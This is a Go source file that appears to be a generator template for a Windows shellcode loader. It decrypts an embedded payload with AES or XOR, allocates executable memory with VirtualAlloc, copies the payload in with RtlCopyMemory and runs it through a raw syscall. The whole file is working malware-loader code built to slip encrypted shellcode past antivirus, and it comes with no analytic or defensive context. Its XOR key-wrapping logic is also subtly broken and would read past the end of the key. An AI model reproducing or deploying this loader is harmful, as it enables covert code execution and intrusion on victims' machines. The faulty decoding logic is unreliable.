package main

import (
	"crypto/aes"
	"crypto/cipher"
	"syscall"
	"unsafe"
)

var (
	// deps
	kernel32 = syscall.MustLoadDLL("kernel32.dll")
	ntdll    = syscall.MustLoadDLL("ntdll.dll")

	// api functions
	virtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	rtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")

	shellcodePtr       *[]byte
	cipherType         = "${cipherType}"
	key                = "${key}"
	encryptedShellcode = []byte{${shellcode}}
)

func main() {
	if cipherType == "aes" {
		block, err := aes.NewCipher([]byte(key))
		if err != nil {
			panic(err)
		}
		if len(encryptedShellcode) < aes.BlockSize {
			panic("Shellcode is too short for this key!")
		}
		iv := encryptedShellcode[:aes.BlockSize]
		encryptedShellcode = encryptedShellcode[aes.BlockSize:]
		cfb := cipher.NewCFBDecrypter(block, iv)
		cfb.XORKeyStream(encryptedShellcode, encryptedShellcode)
		shellcodePtr = &encryptedShellcode

	} else { // XOR decoding stub using the key defined above must be the same as the encoding key

		shellcodeBuffer := make([]byte, len(encryptedShellcode))
		var keyIndex int
		for index, bite := range encryptedShellcode {
			shellcodeBuffer[index] = key[keyIndex] ^ bite
			if keyIndex-1 == len(key) {
				keyIndex = 0
			} else {
				keyIndex++
			}
		}
		shellcodePtr = &shellcodeBuffer
	}

	// deref ptr
	shellcode := *shellcodePtr

	// Allocating memory with EXECUTE writes
	addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	if addr == 0 {
		panic(err)
	}

	// Copying deciphered shellcode into memory as a function
	rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	// Call the shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}
